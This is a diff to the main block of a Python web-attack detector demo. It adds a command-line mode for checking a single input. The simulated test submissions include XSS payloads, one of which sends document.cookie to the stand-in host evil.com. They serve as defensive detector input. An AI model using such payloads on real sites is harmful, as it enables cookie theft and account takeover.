@@ -136,23 +136,38 @@ def detect(
 
 
 if __name__ == "__main__":
+    import sys
+
     model = anomaly.load_model()
 
-    # Simulated incoming submissions, each with a source IP and target field --
-    # this is the "traffic" the demo will show being processed.
-    samples = [
-        ("203.0.113.7", "comment", "Great article, thanks for sharing!"),
-        ("198.51.100.23", "comment", "<img src=x onerror=alert(1)>"),
-        ("198.51.100.23", "search", "<script>fetch('http://evil.com/?c='+document.cookie)</script>"),
-        ("192.0.2.55", "username", "';alert(String.fromCharCode(88,83,83))//"),
-    ]
-
-    print(f"{'SOURCE':<22} {'FIELD':<10} {'VERDICT':<7} {'ATTACK TYPE':<45} {'SEV':<7} INPUT")
-    for source_id, field, text in samples:
-        result = detect(text, source_id, field, anomaly_model=model)
+    if len(sys.argv) > 1:
+        # Ad-hoc single-input mode: python detector.py "some input"
+        text = " ".join(sys.argv[1:])
+        result = detect(text, source_id="cli", target_field="cli", anomaly_model=model)
         atk = result["attack_type"] or "-"
         sev = result["severity"] or "-"
-        print(f"{source_id:<22} {field:<10} {result['verdict']:<7} {atk:<45} {sev:<7} {text[:40]!r}")
+        print(f"input:    {text!r}")
+        print(f"verdict:  {result['verdict']}")
+        print(f"type:     {atk}")
+        print(f"severity: {sev}")
+        print(f"reason:   {result['reason']}")
+        print(f"anomaly_score: {result['anomaly_score']:+.3f}")
+    else:
+        # Simulated incoming submissions, each with a source IP and target field --
+        # this is the "traffic" the demo will show being processed.
+        samples = [
+            ("203.0.113.7", "comment", "Great article, thanks for sharing!"),
+            ("198.51.100.23", "comment", "<img src=x onerror=alert(1)>"),
+            ("198.51.100.23", "search", "<script>fetch('http://evil.com/?c='+document.cookie)</script>"),
+            ("192.0.2.55", "username", "';alert(String.fromCharCode(88,83,83))//"),
+        ]
 
-    print("\nIncident log after this run:\n")
-    log.print_incident_blocks()
+        print(f"{'SOURCE':<22} {'FIELD':<10} {'VERDICT':<7} {'ATTACK TYPE':<45} {'SEV':<7} INPUT")
+        for source_id, field, text in samples:
+            result = detect(text, source_id, field, anomaly_model=model)
+            atk = result["attack_type"] or "-"
+            sev = result["severity"] or "-"
+            print(f"{source_id:<22} {field:<10} {result['verdict']:<7} {atk:<45} {sev:<7} {text[:40]!r}")
+
+        print("\nIncident log after this run:\n")
+        log.print_incident_blocks()
